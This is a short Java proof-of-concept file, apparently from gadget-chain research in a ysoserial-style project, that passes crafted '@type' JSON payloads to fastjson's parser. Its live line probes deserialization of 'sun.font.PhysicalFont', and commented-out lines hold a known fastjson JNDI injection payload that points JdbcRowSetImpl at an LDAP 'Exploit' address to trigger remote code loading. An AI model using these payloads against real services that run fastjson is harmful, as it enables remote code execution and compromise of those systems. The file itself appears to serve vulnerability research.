package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Poc4 {



    public static void main(String[] args) throws Exception {




        Class clazz2 = Class.forName("javax.swing.DefaultCellEditor$3");
//        Constructor bindingEnumerationConstructor = clazz2.getConstructor();
//        Constructor bindingEnumerationConstructor = clazz2.getDeclaredConstructor();
//        bindingEnumerationConstructor.setAccessible(true);
//        Object bindingEnumerationObject = bindingEnumerationConstructor.newInstance();

//        String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:8990/Exploit\", \"autoCommit\":true,\"Url\":{\"@type\":\"javax.swing.UIDefaults\"}}\n";
//        String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"Params\":{\"@type\":\"javax.swing.UIDefaults\"}}\n";
        //        String json = JSON.toJSONString(uiDefaults, SerializerFeature.WriteClassName);
        String poc = "{\"@type\":\"sun.font.PhysicalFont\",\"Pressed\":\"asd\"}\n";
        JSON.parseObject(poc, Feature.SupportNonPublicField);

    }

}
